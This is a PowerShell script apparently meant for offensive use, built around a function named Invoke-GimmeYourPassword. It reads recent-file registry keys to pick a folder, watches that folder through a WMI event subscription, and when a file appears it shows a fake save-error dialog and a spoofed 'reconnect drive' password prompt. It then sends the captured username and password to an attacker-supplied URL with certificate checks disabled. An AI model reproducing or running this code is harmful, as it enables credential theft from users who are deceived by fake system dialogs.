function obtain-path() {
    param (
    [string]$Path,
    [int]$Source
    )
    
        $FinalPath=''
        $pathSplit=$path.split("\")
		$pathToMonitorDriverLetter=$pathSplit[0]
        $pathOnly= $pathSplit[1 .. $($pathSplit.length -2) ]
        foreach($item in $pathOnly) {
                $FinalPath= $FinalPath + '\\' + $item
            }
        $FinalPath = $FinalPath + '\\'    
        if ($source -eq 1) {
            #Non invoke chain
           #write-output "Source is equal to 1"
            $FinalPath=$pathToMonitorDriverLetter+$finalPath
            return $FinalPath
        }         
        elseif ($source -eq 2) {
            #Invoke chain 
            $myarray=@()
            $myarray+=$pathToMonitorDriverLetter
            $myarray+=$finalPath
            return $myarray
        }
        
} 


function search-keys { 
    #Include an optional parameter. This will determine how the function obtain path works. It will show which path will be monitored if invoke-gimme is ran. 
    #If the INVOKE flag is present we will set the source to two, as we need to return additional parameters for the temporary WMI portion. 
	param (
	[switch]$Invoke
	)
    if (test-path "HKCU:\software\gimme")
	{
		#This demo path must have a filename. Othwerwise it will be inconsistent with the MRU entries which do contain a filename. 
		$pathToMonitor="Z:\demo\filename.txt"
	}
	elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
    {
        write-output "hit 2 MRU path exists"
        $pathToMonitor="Z:\demo"
    }
    #elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User #MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
	#{
    #   	write-output "hit 1 MRU path exists"
	#}
	#elseif (test-path "HKCU:\Software\Microsoft\Office\14.0\Word\File MRU" ) 
    #{
    #    write-output "hit 2 MRU path exists"
    #}
	#elseif (test-path "HKCU:\Software\Microsoft\Office\12.0\Word\File MRU")				
	#{
	#   write-output "hit 3 MRU path exists"
	#   $pathToMonitor="C:\Users\octavio\Documents"
	#}
	elseif (test-path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List") 
    {
        $pathToMonitor=(get-itemproperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List").file1
        #write-output $pathToMonitor
    }
    if ($Invoke)
	{
	#If Invoke present
    
    $returnValues=obtain-path -source 2 -path $pathToMonitor    
    return $returnValues
    }
	else 
    {
	#Use this path if $invoke is not present. 
      #write-output "source set to 1"
      obtain-path -source 1 -path $pathToMonitor
    }
	

}

function start-tempsubscription{
    param (
        [string]$pathToMonitorDriverLetter,
        [string]$pathToMonitorPathRemainder,
        [string]$URL
    )
    $global:Target="http://$URL"
    write-output $target
    $localComputerName=$env:COMPUTERNAME
    $query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'")
    $action = {
	$global:MyEVT=$event
    write-host  "Event Occurred" 
	
    
    $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename
    $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension
    $modDriveLetter=$event.sourceEventArgs.newevent.TargetInstance.Drive
    $modfilenameExtension=$modfilename+"."+$modExtension

    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.Interaction]::MsgBox("Unable to reach $modDriveLetter Drive. File $modFileNameExtension was not saved", 'okonly,SystemModal,Information', "Error saving file")
    $cred = $host.ui.promptforcredential("Enter password to reconnect the $modDriveLetter drive",'',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
    if ($cred) {
        $wc = new-object net.webclient;
        $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stae (Red Hat modified)");
        $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
        $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
        $result=$wc.downloadstring("$Target");
        #$result=$wc.downloadstring('http://192.168.1.159');
        }
    
  }
	   register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action $Action
}
    
    function Invoke-GimmeYourPassword {
	param (
        [Parameter(Mandatory=$True)]
		[string]$URL
    )
	write-host $destination
    Unregister-Event -SourceIdentifier MonitorFiles3
    $pathToMonitor=search-keys -Invoke
    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1] -URL $URL
   }
